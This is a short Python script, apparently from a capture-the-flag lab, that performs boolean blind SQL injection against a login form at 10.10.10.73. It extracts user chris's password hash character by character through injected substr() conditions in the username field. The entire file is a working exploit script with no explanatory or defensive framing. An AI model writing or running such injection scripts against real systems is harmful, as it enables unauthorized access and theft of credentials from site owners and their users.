import requests
import sys

def get_sql(i, c):
    return f"chris\' AND substr(password,{i},1) = \'{c}\' -- -"

def check_ord(i):
    injection = f"chris\' AND ord(substr(password,{i},1)) > \'58\' -- -"
    data = {'username': injection, 'password':'idk'}
    r = requests.post('http://10.10.10.73/login.php', data=data)
    if 'Wrong' in r.text:
        return True
    else:
        return False

for x in range(1,32):
    if check_ord(x):
        charset = 'abcdef'
    else:
        charset = '0123456789'

    for char in charset:
        injection = get_sql(x, char)
        data = {'username':injection, 'password':'idk'}
        r = requests.post('http://10.10.10.73/login.php', data=data)
        if 'Wrong identification' in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
